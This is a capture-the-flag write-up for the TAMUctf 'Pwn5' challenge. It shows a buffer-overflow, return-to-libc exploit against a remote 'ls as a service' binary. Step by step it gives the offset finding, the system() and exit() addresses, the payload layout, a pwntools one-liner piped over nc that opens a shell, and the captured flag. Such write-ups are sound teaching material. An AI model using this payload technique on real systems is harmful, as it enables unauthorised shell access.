# Pwn5
Pwn

## Challenge 

nc pwn.tamuctf.com 4325

Difficulty: medium

[pwn5](pwn5)

## Solution

Same as Pwn2, but now we have a char limit. We are only allowed 3 chars.

	$ nc pwn.tamuctf.com 4325
	ls as a service (laas)(Copyright pending)
	Version 2: Less secret strings and more portable!
	Enter the arguments you would like to pass to ls:
	ABCD
	Result of ls ABC:

However, notice that it is still vulnerable to buffer overflow

	# pwn cyclic 50 | strace ./pwn5
	--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x66616161} ---

	# pwn cyclic -l 0x66616161
	17

We can try a return-to-libc attack to get it to run a shell.

### return-to-libc attack

> Reference:
> https://bitvijays.github.io/LFC-BinaryExploitation.html

Find address of system() and exit() function

	(gdb) info add system
	Symbol "system" is at 0x804ee30 in a file compiled without debugging.

	(gdb) info add exit
	Symbol "exit" is at 0x804e330 in a file compiled without debugging.


Try payload without parameters

	# python -c 'from pwn import *; print cyclic(17) + p32(0x0804ee30)' | ./pwn5
	ls as a service (laas)(Copyright pending)
	Version 2: Less secret strings and more portable!
	Enter the arguments you would like to pass to ls:
	Result of ls aaa:
	ls: cannot access 'aaa': No such file or directory
	sh: 1: : not found
	Segmentation fault

So it works, but we need to pass a parameter of a string. This is so we can execute it like system("/bin/sh") and get a shell.

In hopper disassembly, we see a static string in the memory

		aBinsh:
	080bc140         db         "/bin/sh", 0

---

So the format for our payload is as follows:

	[17 bytes]  JUNK: fill buffer
	[4 bytes]   0x0804ee30: return to system() address
	[4 bytes]   0x0804e330: return to exit() after executing system() 
	[4 bytes]   0x080bc140: parameter 1 of system()

Run final payload

	$ SCRIPT='from pwn import *; print cyclic(17) + p32(0x0804ee30) + p32(0x0804e330) + p32(0x080bc140)'
	$ # (python -c "$SCRIPT"; cat) | nc pwn.tamuctf.com 4325
	
	ls as a service (laas)(Copyright pending)
	Version 2: Less secret strings and more portable!
	Enter the arguments you would like to pass to ls:
	Result of ls aaa:

	ls -la
		total 728
		drwxr-xr-x 1 root    root      4096 Feb 19 20:47 .
		drwxr-xr-x 1 root    root      4096 Feb 23 22:23 ..
		-r--r--r-- 1 pwnflag pwnflag     32 Feb 19 20:46 flag.txt
		-rwsr-xr-x 1 pwnflag pwnflag 730072 Feb 19 20:46 pwn5
	cat flag.txt
		gigem{r37urn_0r13n73d_pr4c71c3}

## Flag

	gigem{r37urn_0r13n73d_pr4c71c3}
